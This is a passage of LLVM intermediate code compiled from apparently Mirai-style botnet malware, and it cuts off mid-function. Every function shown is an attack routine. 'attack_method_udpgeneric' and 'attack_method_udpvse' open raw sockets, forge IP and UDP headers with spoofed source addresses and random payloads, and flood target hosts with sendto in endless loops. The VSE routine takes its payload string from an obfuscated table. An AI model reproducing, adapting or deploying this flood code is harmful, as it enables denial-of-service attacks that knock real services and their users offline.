  %326 = load i16, i16* %325, align 2
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0, i32 1
  store i16 %326, i16* %327, align 2
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0
  %329 = bitcast %struct.sockaddr_in* %328 to %struct.sockaddr*
  %330 = call i64 @sendto(i32 %40, i8* %293, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %329, i32 16) #10
  %331 = load i32, i32* %5, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %5, align 4
  %333 = icmp slt i32 %332, %46
  br i1 %333, label %.lr.ph.split, label %.loopexit.loopexit204

.loopexit150.loopexit:                            ; preds = %103
  br label %.loopexit150

.loopexit150.loopexit205:                         ; preds = %159
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit205, %.loopexit150.loopexit, %4, %82
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %219, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #10
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %68, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %40 = zext i8 %0 to i64
  br i1 %38, label %.lr.ph86.split.us.preheader, label %.lr.ph86.split.preheader

.lr.ph86.split.preheader:                         ; preds = %.lr.ph86
  br label %.lr.ph86.split

.lr.ph86.split.us.preheader:                      ; preds = %.lr.ph86
  br label %.lr.ph86.split.us

.lr.ph86.split.us:                                ; preds = %.lr.ph86.split.us.preheader, %.lr.ph86.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph86.split.us ], [ 0, %.lr.ph86.split.us.preheader ]
  %41 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %42 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %41, i8** %42, align 8
  %43 = getelementptr inbounds i8, i8* %41, i64 20
  store i8 69, i8* %41, align 4
  %44 = getelementptr inbounds i8, i8* %41, i64 1
  store i8 %10, i8* %44, align 1
  %45 = call zeroext i16 @htons(i16 zeroext %37) #11
  %46 = getelementptr inbounds i8, i8* %41, i64 2
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 2
  %48 = call zeroext i16 @htons(i16 zeroext %12) #11
  %49 = getelementptr inbounds i8, i8* %41, i64 4
  %50 = bitcast i8* %49 to i16*
  store i16 %48, i16* %50, align 4
  %51 = getelementptr inbounds i8, i8* %41, i64 8
  store i8 %14, i8* %51, align 4
  %52 = getelementptr inbounds i8, i8* %41, i64 9
  store i8 17, i8* %52, align 1
  %53 = getelementptr inbounds i8, i8* %41, i64 12
  %54 = bitcast i8* %53 to i32*
  store i32 %26, i32* %54, align 4
  %55 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %56 = load i32, i32* %55, align 4
  %57 = getelementptr inbounds i8, i8* %41, i64 16
  %58 = bitcast i8* %57 to i32*
  store i32 %56, i32* %58, align 4
  %59 = call zeroext i16 @htons(i16 zeroext %18) #11
  %60 = bitcast i8* %43 to i16*
  store i16 %59, i16* %60, align 2
  %61 = call zeroext i16 @htons(i16 zeroext %20) #11
  %62 = getelementptr inbounds i8, i8* %41, i64 22
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %39) #11
  %65 = getelementptr inbounds i8, i8* %41, i64 24
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %67 = icmp slt i64 %indvars.iv.next, %40
  br i1 %67, label %.lr.ph86.split.us, label %..preheader_crit_edge.loopexit

; <label>:68:                                     ; preds = %31
  %69 = call i32 @close(i32 %29) #10
  br label %219

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph86.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit99:                 ; preds = %.lr.ph86.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit99, %..preheader_crit_edge.loopexit
  %.lcssa87.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next92, %..preheader_crit_edge.loopexit99 ]
  %.lcssa87 = trunc i64 %.lcssa87.in to i32
  store i32 %.lcssa87, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %70 = icmp eq i32 %26, -1
  %71 = and i32 %11, 65535
  %72 = icmp eq i32 %71, 65535
  %73 = and i32 %17, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %19, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = icmp eq i8 %24, 0
  %78 = zext i16 %. to i64
  %79 = add nuw nsw i64 %78, 8
  %80 = trunc i64 %79 to i32
  %81 = add nuw nsw i64 %78, 28
  %82 = zext i16 %. to i32
  br label %.loopexit

.lr.ph86.split:                                   ; preds = %.lr.ph86.split.preheader, %.lr.ph86.split
  %indvars.iv91 = phi i64 [ %indvars.iv.next92, %.lr.ph86.split ], [ 0, %.lr.ph86.split.preheader ]
  %83 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %84 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv91
  store i8* %83, i8** %84, align 8
  %85 = getelementptr inbounds i8, i8* %83, i64 20
  store i8 69, i8* %83, align 4
  %86 = getelementptr inbounds i8, i8* %83, i64 1
  store i8 %10, i8* %86, align 1
  %87 = call zeroext i16 @htons(i16 zeroext %37) #11
  %88 = getelementptr inbounds i8, i8* %83, i64 2
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %12) #11
  %91 = getelementptr inbounds i8, i8* %83, i64 4
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 4
  %93 = getelementptr inbounds i8, i8* %83, i64 8
  store i8 %14, i8* %93, align 4
  %94 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %95 = getelementptr inbounds i8, i8* %83, i64 6
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = getelementptr inbounds i8, i8* %83, i64 9
  store i8 17, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %83, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %26, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv91, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %83, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #11
  %105 = bitcast i8* %85 to i16*
  store i16 %104, i16* %105, align 2
  %106 = call zeroext i16 @htons(i16 zeroext %20) #11
  %107 = getelementptr inbounds i8, i8* %83, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %39) #11
  %110 = getelementptr inbounds i8, i8* %83, i64 24
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %indvars.iv.next92 = add nsw i64 %indvars.iv91, 1
  %112 = icmp slt i64 %indvars.iv.next92, %40
  br i1 %112, label %.lr.ph86.split, label %..preheader_crit_edge.loopexit99

.loopexit.loopexit:                               ; preds = %144
  br label %.loopexit.backedge

.loopexit.loopexit98:                             ; preds = %196
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %36, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit98
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %70, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %144
  %storemerge8385.us = phi i32 [ %165, %144 ], [ 0, %.lr.ph.split.us.preheader ]
  %113 = sext i32 %storemerge8385.us to i64
  %114 = getelementptr inbounds i8*, i8** %8, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  %117 = getelementptr inbounds i8, i8* %115, i64 20
  %118 = getelementptr inbounds i8, i8* %115, i64 28
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %113, i32 2
  %120 = load i8, i8* %119, align 4
  %121 = icmp ult i8 %120, 32
  br i1 %121, label %122, label %129

; <label>:122:                                    ; preds = %.lr.ph.split.us
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %113, i32 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @ntohl(i32 %124) #11
  %126 = call i32 @htonl(i32 %125) #11
  %127 = getelementptr inbounds i8, i8* %115, i64 16
  %128 = bitcast i8* %127 to i32*
  store i32 %126, i32* %128, align 4
  br label %129

; <label>:129:                                    ; preds = %.lr.ph.split.us, %122
  %130 = getelementptr inbounds i8, i8* %115, i64 12
  %131 = bitcast i8* %130 to i32*
  store i32 0, i32* %131, align 4
  br i1 %72, label %132, label %135

; <label>:132:                                    ; preds = %129
  %133 = getelementptr inbounds i8, i8* %115, i64 4
  %134 = bitcast i8* %133 to i16*
  store i16 0, i16* %134, align 4
  br label %135

; <label>:135:                                    ; preds = %132, %129
  br i1 %74, label %136, label %138

; <label>:136:                                    ; preds = %135
  %137 = bitcast i8* %117 to i16*
  store i16 0, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %136, %135
  br i1 %76, label %139, label %142

; <label>:139:                                    ; preds = %138
  %140 = getelementptr inbounds i8, i8* %115, i64 22
  %141 = bitcast i8* %140 to i16*
  store i16 0, i16* %141, align 2
  br label %142

; <label>:142:                                    ; preds = %139, %138
  br i1 %77, label %144, label %143

; <label>:143:                                    ; preds = %142
  call void @rand_str(i8* nonnull %118, i32 %82)
  %.pre93 = load i32, i32* %5, align 4
  br label %144

; <label>:144:                                    ; preds = %143, %142
  %145 = phi i32 [ %.pre93, %143 ], [ %storemerge8385.us, %142 ]
  %146 = getelementptr inbounds i8, i8* %115, i64 10
  %147 = bitcast i8* %146 to i16*
  store i16 0, i16* %147, align 2
  %148 = bitcast i8* %115 to i16*
  %149 = call zeroext i16 @checksum_generic(i16* %148, i32 20)
  store i16 %149, i16* %147, align 2
  %150 = getelementptr inbounds i8, i8* %115, i64 26
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 2
  %152 = getelementptr inbounds i8, i8* %115, i64 24
  %153 = bitcast i8* %152 to i16*
  %154 = load i16, i16* %153, align 2
  %155 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %116, i8* nonnull %117, i16 zeroext %154, i32 %80)
  store i16 %155, i16* %151, align 2
  %156 = getelementptr inbounds i8, i8* %115, i64 22
  %157 = bitcast i8* %156 to i16*
  %158 = load i16, i16* %157, align 2
  %159 = sext i32 %145 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0, i32 1
  store i16 %158, i16* %160, align 2
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0
  %162 = bitcast %struct.sockaddr_in* %161 to %struct.sockaddr*
  %163 = call i64 @sendto(i32 %29, i8* nonnull %115, i64 %81, i32 16384, %struct.sockaddr* %162, i32 16) #10
  %164 = load i32, i32* %5, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %5, align 4
  %166 = icmp slt i32 %165, %35
  br i1 %166, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %196
  %storemerge8385 = phi i32 [ %217, %196 ], [ 0, %.lr.ph.split.preheader ]
  %167 = sext i32 %storemerge8385 to i64
  %168 = getelementptr inbounds i8*, i8** %8, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = bitcast i8* %169 to %struct.iphdr*
  %171 = getelementptr inbounds i8, i8* %169, i64 20
  %172 = getelementptr inbounds i8, i8* %169, i64 28
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %169, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split, %176
  br i1 %72, label %184, label %187

; <label>:184:                                    ; preds = %183
  %185 = getelementptr inbounds i8, i8* %169, i64 4
  %186 = bitcast i8* %185 to i16*
  store i16 0, i16* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %184, %183
  br i1 %74, label %188, label %190

; <label>:188:                                    ; preds = %187
  %189 = bitcast i8* %171 to i16*
  store i16 0, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %188, %187
  br i1 %76, label %191, label %194

; <label>:191:                                    ; preds = %190
  %192 = getelementptr inbounds i8, i8* %169, i64 22
  %193 = bitcast i8* %192 to i16*
  store i16 0, i16* %193, align 2
  br label %194

; <label>:194:                                    ; preds = %191, %190
  br i1 %77, label %196, label %195

; <label>:195:                                    ; preds = %194
  call void @rand_str(i8* %172, i32 %82)
  %.pre = load i32, i32* %5, align 4
  br label %196

; <label>:196:                                    ; preds = %194, %195
  %197 = phi i32 [ %storemerge8385, %194 ], [ %.pre, %195 ]
  %198 = getelementptr inbounds i8, i8* %169, i64 10
  %199 = bitcast i8* %198 to i16*
  store i16 0, i16* %199, align 2
  %200 = bitcast i8* %169 to i16*
  %201 = call zeroext i16 @checksum_generic(i16* %200, i32 20)
  store i16 %201, i16* %199, align 2
  %202 = getelementptr inbounds i8, i8* %169, i64 26
  %203 = bitcast i8* %202 to i16*
  store i16 0, i16* %203, align 2
  %204 = getelementptr inbounds i8, i8* %169, i64 24
  %205 = bitcast i8* %204 to i16*
  %206 = load i16, i16* %205, align 2
  %207 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %170, i8* %171, i16 zeroext %206, i32 %80)
  store i16 %207, i16* %203, align 2
  %208 = getelementptr inbounds i8, i8* %169, i64 22
  %209 = bitcast i8* %208 to i16*
  %210 = load i16, i16* %209, align 2
  %211 = sext i32 %197 to i64
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %211, i32 0, i32 1
  store i16 %210, i16* %212, align 2
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %211, i32 0
  %214 = bitcast %struct.sockaddr_in* %213 to %struct.sockaddr*
  %215 = call i64 @sendto(i32 %29, i8* %169, i64 %81, i32 16384, %struct.sockaddr* %214, i32 16) #10
  %216 = load i32, i32* %5, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %5, align 4
  %218 = icmp slt i32 %217, %35
  br i1 %218, label %.lr.ph.split, label %.loopexit.loopexit98

; <label>:219:                                    ; preds = %4, %68
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 20)
  %22 = call i8* @table_retrieve_val(i32 20, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %215, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %71, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br i1 %31, label %.lr.ph73.split.us.preheader, label %.lr.ph73.split.preheader

.lr.ph73.split.preheader:                         ; preds = %.lr.ph73
  br label %.lr.ph73.split

.lr.ph73.split.us.preheader:                      ; preds = %.lr.ph73
  br label %.lr.ph73.split.us

.lr.ph73.split.us:                                ; preds = %.lr.ph73.split.us.preheader, %.lr.ph73.split.us
  %32 = phi i32 [ %69, %.lr.ph73.split.us ], [ 0, %.lr.ph73.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 128, i64 1) #10
  %34 = sext i32 %32 to i64
  %35 = getelementptr inbounds i8*, i8** %9, i64 %34
  store i8* %33, i8** %35, align 8
  %36 = getelementptr inbounds i8, i8* %33, i64 20
  %37 = getelementptr inbounds i8, i8* %33, i64 28
  store i8 69, i8* %33, align 4
  %38 = getelementptr inbounds i8, i8* %33, i64 1
  store i8 %11, i8* %38, align 1
  %39 = load i32, i32* %6, align 4
  %40 = trunc i32 %39 to i16
  %41 = add i16 %40, 32
  %42 = call zeroext i16 @htons(i16 zeroext %41) #11
  %43 = getelementptr inbounds i8, i8* %33, i64 2
  %44 = bitcast i8* %43 to i16*
  store i16 %42, i16* %44, align 2
  %45 = call zeroext i16 @htons(i16 zeroext %13) #11
  %46 = getelementptr inbounds i8, i8* %33, i64 4
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 4
  %48 = getelementptr inbounds i8, i8* %33, i64 8
  store i8 %15, i8* %48, align 4
  %49 = getelementptr inbounds i8, i8* %33, i64 9
  store i8 17, i8* %49, align 1
  %50 = load i32, i32* @LOCAL_ADDR, align 4
  %51 = getelementptr inbounds i8, i8* %33, i64 12
  %52 = bitcast i8* %51 to i32*
  store i32 %50, i32* %52, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %34, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds i8, i8* %33, i64 16
  %56 = bitcast i8* %55 to i32*
  store i32 %54, i32* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext %19) #11
  %58 = bitcast i8* %36 to i16*
  store i16 %57, i16* %58, align 2
  %59 = call zeroext i16 @htons(i16 zeroext %21) #11
  %60 = getelementptr inbounds i8, i8* %33, i64 22
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = add i16 %40, 12
  %63 = call zeroext i16 @htons(i16 zeroext %62) #11
  %64 = getelementptr inbounds i8, i8* %33, i64 24
  %65 = bitcast i8* %64 to i16*
  store i16 %63, i16* %65, align 2
  %66 = bitcast i8* %37 to i32*
  store i32 -1, i32* %66, align 4
  %67 = getelementptr inbounds i8, i8* %33, i64 32
  call void @util_memcpy(i8* %67, i8* %22, i32 %39) #10
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %5, align 4
  %70 = icmp slt i32 %69, %29
  br i1 %70, label %.lr.ph73.split.us, label %.preheader.loopexit

; <label>:71:                                     ; preds = %25
  %72 = call i32 @close(i32 %23) #10
  br label %215

.preheader.loopexit:                              ; preds = %.lr.ph73.split.us
  br label %.preheader

.preheader.loopexit89:                            ; preds = %.lr.ph73.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit89, %.preheader.loopexit, %.preheader71
  %73 = and i32 %12, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %18, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %20, 65535
  %78 = icmp eq i32 %77, 65535
  br label %.loopexit

.lr.ph73.split:                                   ; preds = %.lr.ph73.split.preheader, %.lr.ph73.split
  %79 = phi i32 [ %119, %.lr.ph73.split ], [ 0, %.lr.ph73.split.preheader ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds i8*, i8** %9, i64 %81
  store i8* %80, i8** %82, align 8
  %83 = getelementptr inbounds i8, i8* %80, i64 20
  %84 = getelementptr inbounds i8, i8* %80, i64 28
  store i8 69, i8* %80, align 4
  %85 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %11, i8* %85, align 1
  %86 = load i32, i32* %6, align 4
  %87 = trunc i32 %86 to i16
  %88 = add i16 %87, 32
  %89 = call zeroext i16 @htons(i16 zeroext %88) #11
  %90 = getelementptr inbounds i8, i8* %80, i64 2
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = call zeroext i16 @htons(i16 zeroext %13) #11
  %93 = getelementptr inbounds i8, i8* %80, i64 4
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 4
  %95 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %15, i8* %95, align 4
  %96 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %97 = getelementptr inbounds i8, i8* %80, i64 6
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 17, i8* %99, align 1
  %100 = load i32, i32* @LOCAL_ADDR, align 4
  %101 = getelementptr inbounds i8, i8* %80, i64 12
  %102 = bitcast i8* %101 to i32*
  store i32 %100, i32* %102, align 4
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %81, i32 1
  %104 = load i32, i32* %103, align 4
  %105 = getelementptr inbounds i8, i8* %80, i64 16
  %106 = bitcast i8* %105 to i32*
  store i32 %104, i32* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %19) #11
  %108 = bitcast i8* %83 to i16*
  store i16 %107, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %21) #11
  %110 = getelementptr inbounds i8, i8* %80, i64 22
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = add i16 %87, 12
  %113 = call zeroext i16 @htons(i16 zeroext %112) #11
  %114 = getelementptr inbounds i8, i8* %80, i64 24
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = bitcast i8* %84 to i32*
  store i32 -1, i32* %116, align 4
  %117 = getelementptr inbounds i8, i8* %80, i64 32
  call void @util_memcpy(i8* %117, i8* %22, i32 %86) #10
  %118 = load i32, i32* %5, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %5, align 4
  %120 = icmp slt i32 %119, %29
  br i1 %120, label %.lr.ph73.split, label %.preheader.loopexit89

.loopexit.loopexit:                               ; preds = %146
  br label %.loopexit.backedge

.loopexit.loopexit88:                             ; preds = %192
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %30, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit88
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %74, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %146
  %121 = phi i32 [ %167, %146 ], [ 0, %.lr.ph.split.us.preheader ]
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %9, i64 %122
  %124 = load i8*, i8** %123, align 8
  %125 = bitcast i8* %124 to %struct.iphdr*
  %126 = getelementptr inbounds i8, i8* %124, i64 20
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = icmp ult i8 %128, 32
  br i1 %129, label %130, label %137

; <label>:130:                                    ; preds = %.lr.ph.split.us
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @ntohl(i32 %132) #11
  %134 = call i32 @htonl(i32 %133) #11
  %135 = getelementptr inbounds i8, i8* %124, i64 16
  %136 = bitcast i8* %135 to i32*
  store i32 %134, i32* %136, align 4
  br label %137

; <label>:137:                                    ; preds = %.lr.ph.split.us, %130
  %138 = getelementptr inbounds i8, i8* %124, i64 4
  %139 = bitcast i8* %138 to i16*
  store i16 0, i16* %139, align 4
  br i1 %76, label %140, label %142

; <label>:140:                                    ; preds = %137
  %141 = bitcast i8* %126 to i16*
  store i16 0, i16* %141, align 2
  br label %142

; <label>:142:                                    ; preds = %140, %137
  %143 = getelementptr inbounds i8, i8* %124, i64 22
  %144 = bitcast i8* %143 to i16*
  br i1 %78, label %145, label %._crit_edge77

._crit_edge77:                                    ; preds = %142
  %.pre80 = load i16, i16* %144, align 2
  br label %146

; <label>:145:                                    ; preds = %142
  store i16 0, i16* %144, align 2
  br label %146

; <label>:146:                                    ; preds = %._crit_edge77, %145
  %147 = phi i16 [ %.pre80, %._crit_edge77 ], [ 0, %145 ]
  %148 = getelementptr inbounds i8, i8* %124, i64 10
  %149 = bitcast i8* %148 to i16*
  store i16 0, i16* %149, align 2
  %150 = bitcast i8* %124 to i16*
  %151 = call zeroext i16 @checksum_generic(i16* %150, i32 20)
  store i16 %151, i16* %149, align 2
  %152 = getelementptr inbounds i8, i8* %124, i64 26
  %153 = bitcast i8* %152 to i16*
  store i16 0, i16* %153, align 2
  %154 = getelementptr inbounds i8, i8* %124, i64 24
  %155 = bitcast i8* %154 to i16*
  %156 = load i16, i16* %155, align 2
  %157 = load i32, i32* %6, align 4
  %158 = add i32 %157, 12
  %159 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %125, i8* nonnull %126, i16 zeroext %156, i32 %158)
  store i16 %159, i16* %153, align 2
